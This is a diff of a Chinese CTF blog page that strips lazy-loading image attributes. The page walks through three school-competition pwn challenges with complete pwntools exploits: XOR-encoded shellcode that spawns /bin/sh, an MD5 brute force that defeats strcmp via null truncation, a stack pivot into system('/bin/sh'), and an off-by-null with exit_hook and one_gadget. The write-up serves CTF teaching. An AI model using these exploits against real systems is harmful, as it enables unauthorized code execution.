@@ -204,7 +204,7 @@
   </transition>
   <div class="drawer-box" :class="{'active': visible}">
     <div class="drawer-box-head bg-color">
-      <img class="drawer-box-head_logo lazyload placeholder" src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="logo">
+      <img class="drawer-box-head_logo" src="/medias/logo.png" alt="logo">
       <h3 class="drawer-box-head_title">ABf1ag&#39;s blog</h3>
       <h5 class="drawer-box-head_desc">CTF to learn,not learn to CTF</h5>
     </div>
@@ -342,7 +342,7 @@
     <div class="blog-title" id="author-avatar">
       
         <div class="avatar">
-          <img src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="logo">
+          <img src="/medias/logo.png" alt="logo">
         </div>
       
       <a href="/" class="logo">ABf1ag&#39;s blog</a>
@@ -612,11 +612,11 @@
 </ul>
 <p>再说到校赛，实话实说，这次校赛的pwn方向的题对新生来说确实难了，或者换种说法就是这些题不是给刚入门pwn的人做的。<del>反思反思再反思</del> 。所以想学pwn方向的小伙伴们不要恐惧他，事实上他也并不是很难，只要你们勇敢的踏出第一步就会发现pwn也就这样（emmmmm）。</p>
 <p>最后想要学习和打ctf的小伙伴们，欢迎来到A&amp;D网络安全协会，校队（Gleaf）的队员也将从协会中选出，欢迎学弟学妹们的加入！</p>
-<p><img src="/.io//image-20211018173843056.png" class="lazyload placeholder" data-srcset="/.io//image-20211018173843056.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211018173843056"></p>
+<p><img src="/.io//image-20211018173843056.png" alt="image-20211018173843056"></p>
 <h3 id="1-Gpwn1"><a href="#1-Gpwn1" class="headerlink" title="1.Gpwn1"></a>1.Gpwn1</h3><p>可以看见在init函数中有mmap()函数，这个函数的作用是在内存中映射一段空间，在这里这个空间是可读可写可执行的。</p>
-<p><img src="/.io//image-20211018174057975.png" class="lazyload placeholder" data-srcset="/.io//image-20211018174057975.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211018174057975"></p>
+<p><img src="https://img.le1a.com/2023/02/07/2755cd362f8d1.png" alt="image-20211018174057975"></p>
 <p>接着程序对我们的输入进行判断，如果是\x00那么程序结束，如果没有\x00那么输入结束后将会跳转到映射的地址执行shellcode。</p>
-<p><img src="/.io//image-20211018174247661.png" class="lazyload placeholder" data-srcset="/.io//image-20211018174247661.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211018174247661"></p>
+<p><img src="https://img.le1a.com/2023/02/07/d454746e286de.png" alt="image-20211018174247661"></p>
 <p>因此只需要我们写入没有\x00的shellcode即可。这种shellcode有很多写法，可以用alpha3，或者自己写一个编码器将shellcode进行异或或其他加密处理。</p>
 <p>exp：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&#x27;./Gpwn1&#x27;)</span><br><span class="line">#io = remote(&#x27;127.0.0.1&#x27;,10002)</span><br><span class="line">context.arch=&#x27;amd64&#x27;</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">#shellcode = asm(shellcraft.amd64.sh())</span><br><span class="line">shellcode = &#x27;mov rax,0x&#x27;+&#x27;/bin/sh\x00&#x27;[::-1].encode(&#x27;hex&#x27;)+&#x27;;push rax;mov rdi,rsp;xor rsi,rsi;xor rdx,rdx;push 59;pop rax;syscall&#x27;</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">payload = &#x27;&#x27;</span><br><span class="line">for i in shellcode:</span><br><span class="line">	payload += chr(ord(i)^0x44)</span><br><span class="line"></span><br><span class="line">payload1 = &#x27;xor rax,rax;push 0x1;pop rax;shl rax,20;add rax,35;xor rcx,rcx;mov bl,[rax+rcx];xor bl,0x44;mov [rax+rcx],bl;inc rcx;cmp rcx,0x19;jnz $-16;&#x27;</span><br><span class="line">payload1 = asm(payload1)</span><br><span class="line">payload = payload1+payload</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
@@ -624,9 +624,9 @@
 <h3 id="2-Gpwn2"><a href="#2-Gpwn2" class="headerlink" title="2.Gpwn2"></a>2.Gpwn2</h3><p>好像这个题难度就开始上升了，这个题我是根据今年的国赛题改的，考察的点就是strncmp、strcmp \x00截断绕过。</p>
 <p>程序的功能就是输入账号密码，输入正确后就是简单的栈迁移（<del>好像也不简单</del>）</p>
 <p>用ida分析出密码的MD5哈希值为<code>957b49743a06a938c9246950faadbaa9</code>,MD5在线解密后是如下图所示</p>
-<p><img src="/.io//image-20211018192016073.png" class="lazyload placeholder" data-srcset="/.io//image-20211018192016073.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211018192016073"></p>
+<p><img src="https://img.le1a.com/2023/02/07/b85a7a11c9941.png" alt="image-20211018192016073"></p>
 <p>然后输入账号密码发现报错，我们使用gdb调试看一下为什么会报错，发现其实是我们输入密码的时候，有一条代码<code>s[v4]=0</code>,它将存储在s1中的密码的MD5值的第一字节置0，使其比对错误。</p>
-<p><img src="/.io//image-20211018192300031.png" class="lazyload placeholder" data-srcset="/.io//image-20211018192300031.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211018192300031"></p>
+<p><img src="https://img.le1a.com/2023/02/07/0e0abec93004e.png" alt="image-20211018192300031"></p>
 <p>因此我们容易想到strcmp可以通过\x00截断绕过，就是说如果我们输入的密码的MD5后的第一个字节也是\x00，我们就能绕过strcmp函数进入到漏洞函数中了。因此需要我们爆破MD5，又因为密码的长度被限制到了0x20大小，所以我们从0x10000000000000000000000000000000开始爆破。</p>
 <p>爆破代码如下:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">def md5encry(data):</span><br><span class="line">    md5 = hashlib.md5()  # 应用MD5算法</span><br><span class="line">    md5.update(data.encode(&#x27;utf-8&#x27;))</span><br><span class="line">    md = int(md5.hexdigest(), 16)</span><br><span class="line">    return md</span><br><span class="line"></span><br><span class="line">for i in range(0x10000000000000000000000000000000,0x20000000000000000000000000000000):</span><br><span class="line">    h1 = hex(md5encry(hex(i)[2:]))[2:]</span><br><span class="line">    if len(h1) != 0x20:</span><br><span class="line">        h1 = h1.rjust(0x20,&#x27;0&#x27;)</span><br><span class="line">        #print((h1))</span><br><span class="line">    if h1[0]==&#x27;0&#x27; and h1[1]==&#x27;0&#x27;:</span><br><span class="line">        print(h1)</span><br><span class="line">        print(hex(i))</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
@@ -636,7 +636,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&#x27;./Gpwn2&#x27;)</span><br><span class="line">elf = ELF(&#x27;./Gpwn2&#x27;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">system = elf.plt[&#x27;system&#x27;]</span><br><span class="line">leave_ret = 0x80495B1</span><br><span class="line">io.recvuntil(&#x27;Checkname:\n&#x27;)</span><br><span class="line">payload = &#x27;admin\x0a&#x27;</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(&#x27;Pass:\n&#x27;)</span><br><span class="line">payload = &#x27;10000000000000000000000000000266&#x27;</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(&#x27;Success\n&#x27;)</span><br><span class="line"></span><br><span class="line">payload = &#x27;a&#x27;*0x18+p32(0x804b500+0x18)+p32(0x804959B)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.send(payload)</span><br><span class="line">raw_input()</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">payload = p32(system)+p32(0)+p32(0x804b50c)+&#x27;/bin/sh\x00&#x27;</span><br><span class="line">payload = payload.ljust(0x18,&#x27;\x00&#x27;)</span><br><span class="line">payload += p32(0x804b500-4)+p32(leave_ret)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <h3 id="3-Gpwn3"><a href="#3-Gpwn3" class="headerlink" title="3.Gpwn3"></a>3.Gpwn3</h3><p>这个题利用的是strcpy、strcat等一些对字符串操作的函数的漏洞，当他们复制字符串的时候会把字符串的最后一个字节\x00给带上，极容易造成off-by-null漏洞。而这个题的漏洞点正在于此，\x00正好将存放长度的地址覆盖置0，就可以将长度的值改写为一个很大的值，打败boss进入到奖励函数中。</p>
-<p><img src="/.io//image-20211018200812142.png" class="lazyload placeholder" data-srcset="/.io//image-20211018200812142.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211018200812142"></p>
+<p><img src="https://img.le1a.com/2023/02/07/be1a447af5865.png" alt="image-20211018200812142"></p>
 <p>在这里我将所有函数返回都改写成了exit()函数，目的就是想让你们利用exit_hook。[exit_hook的知识点]( <a target="_blank" rel="noopener" href="https://blackbird-bb.github.io/2021/05/20/PWN%E5%AD%A6%E4%B9%A0%E2%80%94exit-hook-%E5%81%B7%E5%AE%B6/">PWN学习—exit_hook-偷家 - BlackBird’s Blog (blackbird-bb.github.io)</a> ) 参考这位西电大佬写的博客，然后直接打onegadget就ok了。在打one_gadget的时候正常出来的四个gadget不能打通，这时候在one_gadget后加上-l2可以找到更多的gadget。</p>
 <p>exp：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io=process(&#x27;./Gpwn3&#x27;)</span><br><span class="line">io=remote(&#x27;127.0.0.1&#x27;,10001)</span><br><span class="line">elf=ELF(&#x27;./Gpwn3&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc-2.23.so&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def create(description):</span><br><span class="line">	io.sendlineafter(&#x27;choice:&#x27;,&#x27;1&#x27;)</span><br><span class="line">	io.sendafter(&#x27; level :\n&#x27;,description)</span><br><span class="line"></span><br><span class="line">def power(description):</span><br><span class="line">	io.sendlineafter(&#x27;choice:&#x27;,&#x27;2&#x27;)</span><br><span class="line">	io.sendafter(&#x27;another level :&#x27;,description)	</span><br><span class="line"></span><br><span class="line">def beat():	</span><br><span class="line">	io.sendlineafter(&#x27;choice:&#x27;,&#x27;3&#x27;)</span><br><span class="line"></span><br><span class="line">def give_up():</span><br><span class="line">	io.sendlineafter(&#x27;choice:&#x27;,&#x27;4&#x27;)</span><br><span class="line">		 </span><br><span class="line">def exp():</span><br><span class="line">	create(&#x27;a&#x27;*19+&#x27;\n&#x27;)</span><br><span class="line">	power(&#x27;a&#x27;)</span><br><span class="line">	power(&#x27;\xff\xff\xff&#x27;)</span><br><span class="line">	beat()</span><br><span class="line">	</span><br><span class="line">	io.recvuntil(&#x27;reward: &#x27;)</span><br><span class="line">	puts=int(io.recv(14),16)</span><br><span class="line">	libc_base=puts-libc.symbols[&#x27;puts&#x27;]	</span><br><span class="line">	print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">	dl_rtld_unlock_recursive = libc_base+0x5f0040+3856</span><br><span class="line">	gadget=[0x45226,0x4527a,0xf03a4,0xf1247,0xcd173,0xcd248,0xf03b0,0xf67f0]</span><br><span class="line">	#gdb.attach(io)</span><br><span class="line">	io.sendafter(&#x27;your name:&#x27;,p64(dl_rtld_unlock_recursive))</span><br><span class="line">	io.sendafter(&#x27;for you!&#x27;,p64(gadget[7]+libc_base))</span><br><span class="line">	io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
@@ -680,7 +680,7 @@
   <div class="post-nav-prev post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="/medias/12.jpg" class="lazyload placeholder" data-srcset="/medias/12.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+      <img class="lazyload" src="/medias/12.jpg" alt="">
     </div>
     <a href="/2021/10/21/pwnable-tw-shua-ti-ji-lu/" class="post-nav-link">
       <div class="title">
@@ -702,7 +702,7 @@
   <div class="post-nav-next post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="/medias/3.jpg" class="lazyload placeholder" data-srcset="/medias/3.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
+      <img class="lazyload" src="/medias/3.jpg" src="" alt="">
     </div>
     <a href="/2021/10/14/chang-cheng-bei-final/" class="post-nav-link">
       <div class="title">
@@ -758,10 +758,10 @@ vulnshell一道正常的堆题，当时决赛没有做出来，赛后多亏darry
       </div>
       <div class="donate-box_img">
         <div class="AlipayImg" v-show="tabActive === 'Alipay'">
-          <img src="/medias/1.jpg" class="lazyload placeholder" data-srcset="/medias/1.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="支付宝打赏" />
+          <img src="/medias/1.jpg" alt="支付宝打赏" />
         </div> 
         <div class="WeChatpayImg" v-show="tabActive === 'WeChatpay'">
-          <img src="/medias/2.jpg" class="lazyload placeholder" data-srcset="/medias/2.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="微信打赏" />
+          <img src="/medias/2.jpg" alt="微信打赏" />
         </div>
       </div>
     </div>
@@ -972,7 +972,7 @@ vulnshell一道正常的堆题，当时决赛没有做出来，赛后多亏darry
             <div class="post-img-box">
               <a href="/2099/06/11/ri-zhi/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/11.jpg" class="lazyload placeholder" data-srcset="/medias/11.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/11.jpg" alt="">
               </a>
             </div>
             <div class="post-date-title">
@@ -993,7 +993,7 @@ vulnshell一道正常的堆题，当时决赛没有做出来，赛后多亏darry
             <div class="post-img-box">
               <a href="/2023/01/18/kernel-chu-tan/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/7.jpg" class="lazyload placeholder" data-srcset="/medias/7.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/7.jpg" alt="">
               </a>
             </div>
             <div class="post-date-title">
@@ -1014,7 +1014,7 @@ vulnshell一道正常的堆题，当时决赛没有做出来，赛后多亏darry
             <div class="post-img-box">
               <a href="/2023/01/06/llvmpass-chu-tan/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/1.jpg" class="lazyload placeholder" data-srcset="/medias/1.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/1.jpg" alt="">
               </a>
             </div>
             <div class="post-date-title">
@@ -1035,7 +1035,7 @@ vulnshell一道正常的堆题，当时决赛没有做出来，赛后多亏darry
             <div class="post-img-box">
               <a href="/2022/12/30/nian-zhong-zong-jie-2022/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/15.jpg" class="lazyload placeholder" data-srcset="/medias/15.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/15.jpg" alt="">
               </a>
             </div>
             <div class="post-date-title">
@@ -1056,7 +1056,7 @@ vulnshell一道正常的堆题，当时决赛没有做出来，赛后多亏darry
             <div class="post-img-box">
               <a href="/2022/01/19/yi-gou-pwn-xue-xi-ji-lu/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/11.jpg" class="lazyload placeholder" data-srcset="/medias/11.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/11.jpg" alt="">
               </a>
             </div>
             <div class="post-date-title">
